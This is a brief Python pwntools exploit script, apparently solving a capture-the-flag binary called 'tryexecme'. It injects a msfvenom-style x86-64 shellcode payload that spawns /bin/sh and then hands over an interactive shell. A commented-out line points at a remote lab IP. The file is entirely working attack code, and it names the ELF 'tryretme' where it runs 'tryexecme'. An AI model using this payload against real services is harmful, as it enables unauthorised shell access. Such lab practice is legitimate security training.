from pwn import *

context.log_level = "debug"

p = process(b"./tryexecme")
# p = remote(b"10.201.69.19", 9005)
e = ELF(b"./tryretme")


# └─$ msfvenom -p linux/x64/exec -f C
payload = b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52\x5e\x6a\x3b\x58\x0f\x05"

p.recvuntil(b" :\n")
p.sendline(payload)
p.interactive()
